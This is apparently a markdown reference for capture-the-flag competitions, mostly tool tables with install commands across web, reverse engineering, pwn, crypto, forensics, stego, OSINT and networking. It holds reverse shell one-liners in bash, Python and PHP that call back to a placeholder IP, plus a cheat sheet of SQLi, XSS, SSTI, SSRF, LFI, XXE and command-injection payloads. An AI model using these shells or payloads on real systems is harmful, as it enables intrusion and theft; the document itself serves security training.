# CTF Complete Toolkit — All Domains

> A comprehensive, competition-ready reference covering every major CTF category.
> Organized from initial recon through final flag capture.

---

## Table of Contents

1. [Web Exploitation](#1-web-exploitation)
2. [Reverse Engineering](#2-reverse-engineering)
3. [Binary Exploitation (Pwn)](#3-binary-exploitation-pwn)
4. [Cryptography](#4-cryptography)
5. [Forensics](#5-forensics)
6. [Steganography](#6-steganography)
7. [OSINT](#7-osint)
8. [Network Analysis](#8-network-analysis)
9. [Miscellaneous & Utility](#9-miscellaneous--utility)
10. [Quick Reference Cheatsheet](#10-quick-reference-cheatsheet)

---

## 1. Web Exploitation

### Reconnaissance & Discovery

| Tool | Purpose | Install |
|------|---------|---------|
| **Subfinder** | Passive subdomain enumeration | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| **Amass** | Deep asset & network mapping | `go install github.com/owasp-amass/amass/v4/...@master` |
| **Nmap** | Port & service scanning | `sudo apt install nmap` |
| **RustScan** | Ultra-fast port scanner → pipes to Nmap | `cargo install rustscan` |
| **Shodan CLI** | Search exposed services & banners globally | `pip install shodan` |
| **Censys** | Internet-wide asset search & cert analysis | `pip install censys` |
| **dnsx** | Fast DNS resolution & record lookup | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest` |
| **theHarvester** | Email, host & org OSINT gathering | `sudo apt install theharvester` |
| **WhatWeb** | CMS, tech stack & server fingerprinting | `sudo apt install whatweb` |
| **Aquatone** | Visual screenshot recon of subdomains | `go install github.com/michenriksen/aquatone@latest` |
| **Waybackurls** | Pull historical URLs from Wayback Machine | `go install github.com/tomnomnom/waybackurls@latest` |
| **gau** | Fetch known URLs from multiple archives | `go install github.com/lc/gau/v2/cmd/gau@latest` |

**Key Nmap flags:**
```bash
nmap -sC -sV -p- --min-rate 5000 <target>      # Full port scan with scripts
nmap -sU -top-ports 100 <target>                # UDP top 100
nmap --script vuln <target>                     # Vulnerability scripts
```

---

### Application Mapping & Fuzzing

| Tool | Purpose | Install |
|------|---------|---------|
| **ffuf** | Fastest web fuzzer — dirs, files, params, vhosts | `go install github.com/ffuf/ffuf/v2@latest` |
| **feroxbuster** | Recursive directory busting (Rust-based) | `cargo install feroxbuster` |
| **Gobuster** | Dir, file, DNS, and vhost busting | `go install github.com/OJ/gobuster/v3@latest` |
| **Kiterunner** | API route & endpoint discovery | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
| **arjun** | Hidden HTTP parameter discovery | `pip install arjun` |
| **katana** | JS-aware web crawler & endpoint extractor | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| **hakrawler** | Fast web crawler for JS endpoints | `go install github.com/hakluke/hakrawler@latest` |
| **SecLists** | Master wordlist repo for all fuzzing | `git clone https://github.com/danielmiessler/SecLists` |
| **ParamSpider** | Parameter mining from web archives | `pip install paramspider` |

**Common ffuf patterns:**
```bash
# Directory fuzzing
ffuf -w /path/to/SecLists/Discovery/Web-Content/big.txt -u http://target/FUZZ

# Parameter fuzzing
ffuf -w params.txt -u "http://target/page?FUZZ=test"

# Subdomain vhost fuzzing
ffuf -w subdomains.txt -u http://target -H "Host: FUZZ.target.com" -fs 0
```

---

### Traffic Interception & Analysis

| Tool | Purpose | Install |
|------|---------|---------|
| **Burp Suite Community** | Core HTTP proxy, repeater, intruder | [portswigger.net](https://portswigger.net/burp) |
| **OWASP ZAP** | Free alternative with active scanner | `sudo apt install zaproxy` |
| **mitmproxy** | CLI-based HTTP/S interception proxy | `pip install mitmproxy` |
| **Wappalyzer** | Browser extension: tech stack detection | Browser addon |
| **FoxyProxy** | Browser proxy switcher (Burp/ZAP toggle) | Browser addon |
| **EditThisCookie** | Browser cookie viewer/editor/forger | Browser addon |

---

### Payload Crafting & Token Manipulation

| Tool | Purpose | Install |
|------|---------|---------|
| **CyberChef** | Encode/decode/transform data chains | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |
| **jwt.io** | Decode & inspect JWTs visually | [jwt.io](https://jwt.io) |
| **JWT_Tool** | CLI JWT attack suite (alg:none, key confusion) | `pip install jwt_tool` |
| **PayloadsAllTheThings** | Syntax & bypasses for every web vuln | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| **HackTricks** | Community vuln exploitation notes | [book.hacktricks.xyz](https://book.hacktricks.xyz) |

**JWT attack quick reference:**
```bash
# Decode token
jwt_tool <token>

# Test alg:none bypass
jwt_tool <token> -X a

# RS256 → HS256 key confusion
jwt_tool <token> -X k -pk public.pem
```

---

### Targeted Exploitation

| Tool | Purpose | Install |
|------|---------|---------|
| **SQLmap** | Auto SQL injection detection & exploitation | `sudo apt install sqlmap` |
| **NoSQLMap** | MongoDB / NoSQL injection attacks | `pip install nosqlmap` |
| **XSS Strike** | Advanced XSS detection & exploitation | `pip install xssstrike` |
| **dalfox** | Fast XSS scanner with parameter analysis | `go install github.com/hahwul/dalfox/v2@latest` |
| **Commix** | Command injection automation | `sudo apt install commix` |
| **Tplmap** | Server-Side Template Injection (SSTI) exploitation | `pip install tplmap` |
| **SSRFmap** | SSRF detection and exploitation | `git clone https://github.com/swisskyrepo/SSRFmap` |
| **LFI Suite** | Local File Inclusion exploitation toolkit | `pip install lfi-suite` |
| **Metasploit** | Known CVE exploitation framework | `sudo apt install metasploit-framework` |
| **searchsploit** | Offline ExploitDB search | `sudo apt install exploitdb` |

**SQLmap quick reference:**
```bash
sqlmap -u "http://target/?id=1" --dbs                        # List databases
sqlmap -u "http://target/?id=1" -D db_name --tables          # List tables
sqlmap -u "http://target/?id=1" -D db_name -T users --dump   # Dump table
sqlmap -r request.txt --level=5 --risk=3                     # From Burp request
```

---

### Source Code Recovery & Post-Exploitation

| Tool | Purpose | Install |
|------|---------|---------|
| **GitTools** | Dump exposed `.git` dirs from web servers | `git clone https://github.com/internetwache/GitTools` |
| **TruffleHog** | Scan repos for secrets & API keys | `pip install trufflehog` |
| **Gitleaks** | Fast secrets scanner for git repos | `go install github.com/gitleaks/gitleaks/v8@latest` |
| **Netcat (nc)** | Catch reverse shells after RCE | `sudo apt install netcat-openbsd` |
| **cURL** | HTTP requests, exfiltration, exploit triggering | `sudo apt install curl` |
| **chisel** | TCP tunnel over HTTP for pivoting | `go install github.com/jpillora/chisel@latest` |
| **ligolo-ng** | Advanced tunneling & network pivoting | [GitHub releases](https://github.com/nicocha30/ligolo-ng/releases) |

**Reverse shell one-liners:**
```bash
# Bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("YOUR_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 2. Reverse Engineering

### Disassemblers & Decompilers

| Tool | Purpose | Install |
|------|---------|---------|
| **Ghidra** | NSA-developed full decompiler suite (free) | [ghidra-sre.org](https://ghidra-sre.org) |
| **IDA Free** | Industry-standard disassembler (limited free tier) | [hex-rays.com](https://hex-rays.com) |
| **Binary Ninja** | Modern disassembler with Python API | [binary.ninja](https://binary.ninja) |
| **Cutter** | GUI frontend for Radare2 | `pip install cutter` |
| **Radare2 (r2)** | CLI reverse engineering framework | `sudo apt install radare2` |
| **Rizin** | Radare2 fork with better UX | `sudo apt install rizin` |
| **objdump** | Disassemble ELF binaries | `sudo apt install binutils` |
| **strings** | Extract printable strings from binaries | `sudo apt install binutils` |
| **ltrace / strace** | Trace library & system calls at runtime | `sudo apt install ltrace strace` |
| **file** | Identify binary type and architecture | Built-in |

**Essential RE commands:**
```bash
file binary                        # Identify architecture and type
strings -n 8 binary                # Extract strings ≥8 chars
strings -el binary                 # Extract Unicode strings
objdump -d binary | less           # Disassemble
ltrace ./binary                    # Trace library calls
strace ./binary                    # Trace syscalls
r2 -d binary                       # Open in radare2 debug mode
```

---

### Dynamic Analysis & Debugging

| Tool | Purpose | Install |
|------|---------|---------|
| **GDB** | GNU debugger — essential for dynamic analysis | `sudo apt install gdb` |
| **pwndbg** | GDB plugin with CTF-focused UX | `pip install pwndbg` |
| **peda** | Pattern generation & GDB enhancement | `git clone https://github.com/longld/peda` |
| **GEF** | GDB Enhanced Features plugin | `pip install gef` |
| **x64dbg** | Windows debugger (GUI) | [x64dbg.com](https://x64dbg.com) |
| **OllyDbg** | Classic Windows x86 debugger | [ollydbg.de](http://www.ollydbg.de) |

---

### Deobfuscation & Unpacking

| Tool | Purpose | Install |
|------|---------|---------|
| **upx** | Unpack UPX-compressed binaries | `sudo apt install upx` |
| **de4dot** | .NET binary deobfuscator & unpacker | [GitHub](https://github.com/de4dot/de4dot) |
| **dnSpy** | .NET disassembler and debugger | [GitHub releases](https://github.com/dnSpy/dnSpy/releases) |
| **jadx** | Java/APK decompiler to readable Java | `sudo apt install jadx` |
| **apktool** | APK disassembly and reassembly | `sudo apt install apktool` |
| **dex2jar** | Convert .dex → .jar for Java decompilation | [GitHub](https://github.com/pxb1988/dex2jar) |
| **Java Decompiler (JD-GUI)** | GUI Java .class decompiler | [jd.benow.ca](http://jd.benow.ca) |
| **uncompyle6** | Python bytecode decompiler (.pyc) | `pip install uncompyle6` |
| **pycdc** | Python decompiler (newer Python versions) | [GitHub](https://github.com/zrax/pycdc) |

---

### Script-Based RE

| Tool | Purpose | Install |
|------|---------|---------|
| **angr** | Symbolic execution & binary analysis framework | `pip install angr` |
| **z3** | Microsoft SMT solver (constraint solving) | `pip install z3-solver` |
| **frida** | Dynamic instrumentation toolkit | `pip install frida-tools` |
| **unicorn** | Lightweight CPU emulator framework | `pip install unicorn` |
| **capstone** | Disassembly framework for scripts | `pip install capstone` |
| **keystone** | Assembler framework for scripts | `pip install keystone-engine` |

**angr basic pattern:**
```python
import angr
proj = angr.Project('./binary', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=0xdeadbeef, avoid=0xcafebabe)
print(simgr.found[0].posix.dumps(0))  # stdin that reaches target
```

---

## 3. Binary Exploitation (Pwn)

### Core Library

| Tool | Purpose | Install |
|------|---------|---------|
| **pwntools** | CTF framework for exploit scripting | `pip install pwntools` |
| **GDB + pwndbg** | Heap/stack analysis during exploitation | `pip install pwndbg` |
| **ROPgadget** | Find ROP gadgets in binaries | `pip install ropgadget` |
| **ropper** | Alternative ROP gadget finder | `pip install ropper` |
| **one_gadget** | Find one-shot `execve` gadgets in libc | `gem install one_gadget` |
| **checksec** | Check binary mitigations (NX, PIE, RELRO) | `pip install checksec` |
| **patchelf** | Patch ELF binary interpreter & rpath | `sudo apt install patchelf` |
| **pwninit** | Auto-setup CTF pwn challenge env | `cargo install pwninit` |

**checksec output key:**
```
RELRO:   Partial/Full → GOT overwrite difficulty
Stack:   Canary found → stack smash detection
NX:      Enabled → no shellcode on stack
PIE:     Enabled → base address randomized (ASLR)
```

**pwntools template:**
```python
from pwn import *

elf = ELF('./binary')
libc = ELF('./libc.so.6')
context.binary = elf

p = process('./binary')        # or remote('host', port)
gdb.attach(p, 'break main')   # attach GDB

payload = flat(
    b'A' * offset,
    p64(elf.plt['puts']),
    p64(elf.symbols['main']),
)
p.sendline(payload)
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc @ {hex(libc.address)}')
```

---

### Heap Exploitation

| Tool | Purpose | Install |
|------|---------|---------|
| **heapinspect** | Visual heap layout inspector | `pip install heapinspect` |
| **libheap** | GDB plugin for glibc heap visualization | [GitHub](https://github.com/cloudburst/libheap) |
| **pwndbg** | `heap`, `bins`, `vis_heap_chunks` commands | `pip install pwndbg` |

---

### Libc & Environment

| Tool | Purpose | Install |
|------|---------|---------|
| **libc-database** | Identify libc version from leaked symbol offsets | `git clone https://github.com/niklasb/libc-database` |
| **libc.rip** | Online libc symbol lookup by leaked offset | [libc.rip](https://libc.rip) |
| **glibc-all-in-one** | Download specific glibc versions for testing | [GitHub](https://github.com/matrix1001/glibc-all-in-one) |

---

## 4. Cryptography

### General Crypto Tools

| Tool | Purpose | Install |
|------|---------|---------|
| **SageMath** | Mathematical computation system for crypto | `sudo apt install sagemath` |
| **PyCryptodome** | Python cryptography library | `pip install pycryptodome` |
| **CyberChef** | Visual encode/decode/cipher chains | [gchq.github.io/CyberChef](https://gchq.github.io/CyberChef) |
| **RsaCtfTool** | RSA attack suite (small e, Wiener, factor, etc.) | `pip install rsactftool` |
| **factordb-python** | Query factordb.com for known factorisations | `pip install factordb-python` |
| **z3** | SMT solver for constraint-based crypto | `pip install z3-solver` |
| **sympy** | Python symbolic math library | `pip install sympy` |

---

### Classical Cipher Attacks

| Tool | Purpose | Install |
|------|---------|---------|
| **quipqiup** | Online frequency analysis & substitution solver | [quipqiup.com](https://quipqiup.com) |
| **dcode.fr** | Cipher identification + online solvers | [dcode.fr](https://www.dcode.fr) |
| **CacheSleuth** | Multi-decoder for CTF classic ciphers | [cachesleuth.com](https://www.cachesleuth.com) |
| **Cryptii** | Modular cipher encode/decode | [cryptii.com](https://cryptii.com) |

**Common classical ciphers in CTFs:**
- Caesar / ROT13
- Vigenère
- Atbash
- Playfair
- Rail fence
- Bacon cipher
- Morse code

---

### Hash Cracking

| Tool | Purpose | Install |
|------|---------|---------|
| **hashcat** | GPU-accelerated hash cracking | `sudo apt install hashcat` |
| **john (John the Ripper)** | CPU hash cracking & format conversion | `sudo apt install john` |
| **hash-identifier** | Identify hash type from digest | `pip install hash-identifier` |
| **haiti** | Hash type identification tool | `gem install haiti-hash` |
| **CrackStation** | Online rainbow table lookup | [crackstation.net](https://crackstation.net) |
| **hashes.com** | Online hash lookup database | [hashes.com](https://hashes.com) |

**hashcat mode quick reference:**
```bash
hashcat -m 0    hash.txt wordlist.txt    # MD5
hashcat -m 100  hash.txt wordlist.txt    # SHA1
hashcat -m 1400 hash.txt wordlist.txt    # SHA256
hashcat -m 1800 hash.txt wordlist.txt    # sha512crypt ($6$)
hashcat -m 3200 hash.txt wordlist.txt    # bcrypt
hashcat -a 3    hash.txt ?a?a?a?a?a?a   # Brute-force mask attack
```

---

### RSA Attacks (Quick Reference)

```python
# Small e / cube-root attack (when e=3, no padding)
from sympy import integer_nthroot
m, perfect = integer_nthroot(c, e)
if perfect: print(long_to_bytes(m))

# Wiener's attack → use RsaCtfTool
python3 RsaCtfTool.py -n <N> -e <e> --attack wiener

# Common factor attack (two keys share prime)
from math import gcd
p = gcd(n1, n2)
```

---

## 5. Forensics

### File Analysis & Carving

| Tool | Purpose | Install |
|------|---------|---------|
| **file** | Identify file type from magic bytes | Built-in |
| **exiftool** | Read/write metadata from any file | `sudo apt install exiftool` |
| **binwalk** | Firmware & file embedded content extraction | `pip install binwalk` |
| **foremost** | File carving by header/footer | `sudo apt install foremost` |
| **scalpel** | Advanced file carving from disk images | `sudo apt install scalpel` |
| **xxd / hexdump** | Hex dump & byte-level inspection | `sudo apt install xxd` |
| **strings** | Extract readable strings from binary | Built-in |
| **7zip / unzip** | Extract compressed archives | `sudo apt install p7zip-full` |

**binwalk workflow:**
```bash
binwalk firmware.bin                    # Identify embedded files
binwalk -e firmware.bin                 # Extract all detected files
binwalk --dd='.*' firmware.bin          # Extract everything by signature
```

---

### Disk & Memory Forensics

| Tool | Purpose | Install |
|------|---------|---------|
| **Autopsy** | Full GUI digital forensics platform | [autopsy.com](https://www.autopsy.com) |
| **Volatility 3** | Memory dump analysis framework | `pip install volatility3` |
| **Volatility 2** | Legacy memory analysis (many CTF images) | `pip install volatility` |
| **sleuthkit (TSK)** | CLI filesystem & disk forensics | `sudo apt install sleuthkit` |
| **TestDisk / PhotoRec** | Partition recovery & file carving | `sudo apt install testdisk` |
| **FTK Imager** | Disk image acquisition (Windows) | [exterro.com](https://www.exterro.com) |

**Volatility 3 common plugins:**
```bash
vol3 -f memory.dmp windows.info          # OS info
vol3 -f memory.dmp windows.pslist        # Running processes
vol3 -f memory.dmp windows.cmdline       # CLI commands run
vol3 -f memory.dmp windows.filescan      # Files in memory
vol3 -f memory.dmp windows.hashdump      # Extract NTLM hashes
vol3 -f memory.dmp windows.malfind       # Find injected code
```

---

### Log & Document Analysis

| Tool | Purpose | Install |
|------|---------|---------|
| **grep / ripgrep** | Fast text pattern searching | `sudo apt install ripgrep` |
| **pdftotext** | Extract text from PDFs | `sudo apt install poppler-utils` |
| **oletools** | Analyze Office documents & macros | `pip install oletools` |
| **olevba** | Extract VBA macros from Office files | Included in oletools |
| **libreoffice** | Open & inspect office documents | `sudo apt install libreoffice` |

---

## 6. Steganography

> Stego is one of the most common CTF categories. Always check images, audio, and documents.

### Image Steganography

| Tool | Purpose | Install |
|------|---------|---------|
| **steghide** | Embed/extract data from JPEG/BMP/WAV | `sudo apt install steghide` |
| **stegseek** | Lightning-fast steghide passphrase cracker | [GitHub releases](https://github.com/RickdeJager/stegseek/releases) |
| **zsteg** | LSB & other stego in PNG/BMP | `gem install zsteg` |
| **LSBSteg** | LSB steganography extraction | `pip install stegano` |
| **stegsolve** | Visual bit-plane & colour channel analysis | [GitHub JAR](https://github.com/zardus/ctf-tools/blob/master/stegsolve/install) |
| **imagemagick** | Image manipulation & comparison | `sudo apt install imagemagick` |
| **pngcheck** | Check PNG integrity & chunk structure | `sudo apt install pngcheck` |
| **exiftool** | Metadata that hides flags | `sudo apt install exiftool` |
| **aperisolve.com** | Online multi-stego-tool runner | [aperisolve.com](https://aperisolve.com) |
| **Steg Online** | Online LSB and visual tools | [stegonline.georgeom.net](https://stegonline.georgeom.net) |

**Image stego checklist:**
```bash
file image.png                              # Check type is what it claims
exiftool image.png                          # Read all metadata
strings image.png | grep -i flag           # Readable strings
binwalk image.png                           # Embedded files?
zsteg image.png                             # LSB analysis (PNG/BMP)
steghide extract -sf image.jpg -p ""       # Extract with empty password
stegseek image.jpg rockyou.txt              # Crack steghide password
```

---

### Audio Steganography

| Tool | Purpose | Install |
|------|---------|---------|
| **Audacity** | Visual waveform & spectrogram inspection | `sudo apt install audacity` |
| **Sonic Visualiser** | Advanced spectrogram & pitch analysis | `sudo apt install sonic-visualiser` |
| **mp3stego** | MP3 steganography extraction | [GitHub](https://github.com/fabienpe/MP3Stego) |
| **wavsteg** | LSB steganography in WAV files | `pip install stegano` |
| **DTMF Decoder** | Decode phone-tone signals from audio | [dialabc.com](http://www.dialabc.com/sound/detect/) |
| **deepsound** | Hide/extract data in audio (Windows) | [jpinsoft.net](http://jpinsoft.net/deepsound/) |

**Audio stego checklist:**
- Open in Audacity → View spectrogram (look for hidden text/QR codes)
- Check metadata with exiftool
- Try wavsteg / mp3stego extraction
- Listen for DTMF, Morse, or unusual patterns

---

### Document & Other Stego

| Tool | Purpose | Install |
|------|---------|---------|
| **snow** | Whitespace steganography in text files | `sudo apt install snow` |
| **pdf-parser** | Parse PDF structure for hidden streams | `pip install pdf-parser` |
| **stegpy** | Multi-format steganography tool | `pip install stegpy` |

---

## 7. OSINT

### People & Identity

| Tool | Purpose | Install |
|------|---------|---------|
| **Maltego** | Visual relationship mapping & OSINT automation | [maltego.com](https://www.maltego.com) |
| **theHarvester** | Email, username, host enumeration | `sudo apt install theharvester` |
| **Sherlock** | Find usernames across 300+ social networks | `pip install sherlock-project` |
| **Maigret** | Deep username OSINT across 3000+ sites | `pip install maigret` |
| **holehe** | Check email registration on social platforms | `pip install holehe` |
| **h8mail** | Email OSINT & breach data search | `pip install h8mail` |
| **GHunt** | Google account OSINT from email/ID | `pip install ghunt` |

---

### Domain & IP Intelligence

| Tool | Purpose | Install |
|------|---------|---------|
| **whois** | Domain registration info lookup | `sudo apt install whois` |
| **Shodan** | Exposed service search by IP/banner | `pip install shodan` |
| **Censys** | Certificate & host intelligence | `pip install censys` |
| **VirusTotal** | URL/IP/domain reputation analysis | [virustotal.com](https://www.virustotal.com) |
| **URLScan.io** | Scan & screenshot URLs with context | [urlscan.io](https://urlscan.io) |
| **DNSDumpster** | DNS record visualisation & mapping | [dnsdumpster.com](https://dnsdumpster.com) |
| **SecurityTrails** | Historical DNS & subdomain history | [securitytrails.com](https://securitytrails.com) |
| **Wayback Machine** | Historical website snapshots | [web.archive.org](https://web.archive.org) |

---

### Geolocation & Image OSINT

| Tool | Purpose | Install |
|------|---------|---------|
| **GeoGuessr tips / GeoHints** | Manual geolocation from visual clues | [geohints.com](https://geohints.com) |
| **Google Lens** | Reverse image search via Google | browser |
| **Yandex Images** | Often better than Google for buildings | [yandex.com/images](https://yandex.com/images) |
| **TinEye** | Reverse image search with match history | [tineye.com](https://tineye.com) |
| **exiftool** | GPS coords embedded in photo metadata | `sudo apt install exiftool` |
| **Overpass Turbo** | Advanced OpenStreetMap query tool | [overpass-turbo.eu](https://overpass-turbo.eu) |
| **SunCalc** | Determine time/date from shadow angle & sun position | [suncalc.org](https://www.suncalc.org) |

---

### Social Media & Dark Web

| Tool | Purpose | Install |
|------|---------|---------|
| **twint** | Twitter scraping without API | `pip install twint` |
| **snscrape** | Multi-platform social network scraper | `pip install snscrape` |
| **IntelTechniques tools** | OSINT search form collections | [inteltechniques.com](https://inteltechniques.com) |
| **Tor Browser** | Anonymous .onion site access | [torproject.org](https://www.torproject.org) |

---

## 8. Network Analysis

### Packet Capture & Analysis

| Tool | Purpose | Install |
|------|---------|---------|
| **Wireshark** | GUI packet capture & deep protocol analysis | `sudo apt install wireshark` |
| **tshark** | CLI version of Wireshark | `sudo apt install tshark` |
| **tcpdump** | Lightweight CLI packet capture | `sudo apt install tcpdump` |
| **NetworkMiner** | PCAP analysis with file carving (Windows) | [netresec.com](https://www.netresec.com) |
| **scapy** | Python packet crafting & manipulation | `pip install scapy` |

**Wireshark / tshark quick filters:**
```bash
# tshark one-liners
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "tcp.port==4444"
tshark -r capture.pcap --export-objects http,./exported/   # Extract HTTP objects

# Wireshark display filters
http.request.method == "POST"
tcp.stream eq 5
frame contains "password"
ip.addr == 192.168.1.1
```

---

### Protocol-Specific Tools

| Tool | Purpose | Install |
|------|---------|---------|
| **Ncat / Netcat** | TCP/UDP Swiss army knife | `sudo apt install netcat-openbsd` |
| **socat** | Advanced bidirectional relay | `sudo apt install socat` |
| **openssl s_client** | Inspect TLS/SSL connections | Built-in |
| **ssldump** | Decode TLS session data | `sudo apt install ssldump` |
| **responder** | Capture NetNTLM hashes over network | `pip install responder` |
| **impacket** | SMB, Kerberos, LDAP protocol tools | `pip install impacket` |

---

### Wireless

| Tool | Purpose | Install |
|------|---------|---------|
| **aircrack-ng** | WPA/WEP WiFi cracking suite | `sudo apt install aircrack-ng` |
| **hashcat** | WPA handshake cracking (mode 22000) | `sudo apt install hashcat` |
| **hcxtools** | Convert pcap to hashcat format | `sudo apt install hcxtools` |
| **hcxdumptool** | WiFi packet capture for cracking | `sudo apt install hcxdumptool` |
| **kismet** | Wireless network detector & sniffer | `sudo apt install kismet` |

---

## 9. Miscellaneous & Utility

### Password & Wordlists

| Tool | Purpose | Install |
|------|---------|---------|
| **SecLists** | Master wordlist collection | `git clone https://github.com/danielmiessler/SecLists` |
| **rockyou.txt** | Classic 14M password wordlist | Included in Kali |
| **CeWL** | Custom wordlist from target website | `sudo apt install cewl` |
| **crunch** | Generate wordlists from charset rules | `sudo apt install crunch` |
| **maskprocessor** | Mask-based word generator for hashcat | [GitHub](https://github.com/hashcat/maskprocessor) |
| **mentalist** | GUI wordlist generator | [GitHub](https://github.com/sc0tfree/mentalist) |

---

### Encoding & Decoding

| Tool | Purpose | Use |
|------|---------|-----|
| **CyberChef** | Chain encode/decode operations | [Online](https://gchq.github.io/CyberChef) |
| **base64** | Base64 encode/decode | CLI: `echo "text" \| base64 -d` |
| **xxd** | Hex encode/decode | CLI: `echo "hex" \| xxd -r -p` |
| **python3** | All common encodings | Built-in |

**Common encoding quick reference:**
```bash
echo "dGVzdA==" | base64 -d               # Base64 decode
echo "74657374" | xxd -r -p               # Hex decode
python3 -c "print(bytes.fromhex('74657374').decode())"
python3 -c "import base64; print(base64.b85decode('Xk~0{').decode())"
python3 -c "print('hello'.encode('rot_13'))"  # ROT13
```

---

### Scripting & Automation

| Tool | Purpose | Install |
|------|---------|---------|
| **Python 3 + requests** | Custom exploits, scrapers, automations | `pip install requests` |
| **pwntools** | CTF scripting framework | `pip install pwntools` |
| **Selenium** | Browser automation for JS-heavy apps | `pip install selenium` |
| **httpx** | Fast async HTTP client | `pip install httpx` |
| **jq** | CLI JSON parsing & manipulation | `sudo apt install jq` |

---

### Online Platforms & References

| Resource | Purpose | Link |
|----------|---------|------|
| **GTFOBins** | Unix binary privilege escalation & bypass | [gtfobins.github.io](https://gtfobins.github.io) |
| **LOLBAS** | Windows binary living-off-the-land | [lolbas-project.github.io](https://lolbas-project.github.io) |
| **HackTricks** | Exploitation techniques & checklists | [book.hacktricks.xyz](https://book.hacktricks.xyz) |
| **PayloadsAllTheThings** | Payload syntax for all vuln types | [GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| **exploit-db** | Searchable exploit database | [exploit-db.com](https://www.exploit-db.com) |
| **CyberChef** | Data transformation Swiss army knife | [Online](https://gchq.github.io/CyberChef) |
| **dcode.fr** | Cipher solver + encoding identifier | [dcode.fr](https://www.dcode.fr) |
| **CrackStation** | Hash lookup rainbow tables | [crackstation.net](https://crackstation.net) |
| **libc.rip** | Libc symbol offset lookup | [libc.rip](https://libc.rip) |
| **factordb.com** | RSA modulus factorisation database | [factordb.com](http://factordb.com) |
| **revshells.com** | Reverse shell generator | [revshells.com](https://www.revshells.com) |

---

### CTF Practice Platforms

| Platform | Best For | Link |
|----------|---------|------|
| **PicoCTF** | Beginners — all categories | [picoctf.org](https://picoctf.org) |
| **HackTheBox** | Web, pwn, RE, forensics | [hackthebox.com](https://www.hackthebox.com) |
| **TryHackMe** | Guided learning paths | [tryhackme.com](https://tryhackme.com) |
| **pwn.college** | Binary exploitation (pwn) mastery | [pwn.college](https://pwn.college) |
| **CryptoHack** | Cryptography challenges | [cryptohack.org](https://cryptohack.org) |
| **CTFtime** | Upcoming CTF event calendar | [ctftime.org](https://ctftime.org) |
| **OverTheWire** | Linux/shell wargames | [overthewire.org](https://overthewire.org) |

---

## 10. Quick Reference Cheatsheet

### Flag Format Recognition
```
CTF{...}    picoCTF{...}    HTB{...}    FLAG{...}    flag{...}
```

### First-Look Checklist (Any Challenge File)
```bash
file <file>                  # 1. What type is it?
exiftool <file>              # 2. Any hidden metadata?
strings <file> | grep -i flag  # 3. Readable strings?
binwalk <file>               # 4. Embedded files?
xxd <file> | head -20        # 5. Magic bytes / raw hex?
```

### Common CTF Encodings (Identify by Look)
```
Base64:   A-Za-z0-9+/= (always ends in = or ==)
Base32:   A-Z2-7= (uppercase + digits 2-7)
Hex:      0-9a-f (even character count)
ROT13:    Looks like English gibberish
Binary:   Only 0s and 1s (groups of 8)
Morse:    dots, dashes, spaces
```

### Web Vuln Quick Test Payloads
```
SQLi:     ' OR 1=1--    ' OR SLEEP(5)--
XSS:      <script>alert(1)</script>    <img src=x onerror=alert(1)>
SSTI:     {{7*7}}    ${7*7}    <%= 7*7 %>
SSRF:     http://127.0.0.1/    http://169.254.169.254/
LFI:      ../../../../etc/passwd    ....//....//etc/passwd
XXE:      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
Cmd inj:  ; id    | id    `id`    $(id)
```

### Reverse Shell Listener
```bash
nc -lvnp 4444            # Netcat listener
rlwrap nc -lvnp 4444     # With readline (arrow keys work)
```

### GDB Quick Commands
```
b *0xdeadbeef    → breakpoint at address
r                → run binary
n                → next instruction (step over)
s                → step into
x/20gx $rsp      → examine 20 qwords at stack pointer
p $rax           → print register value
info functions   → list functions
vmmap            → memory layout (pwndbg)
heap             → heap state (pwndbg)
```

---

*Keep this file updated as new tools emerge. Check CTFtime.org for upcoming competitions.*
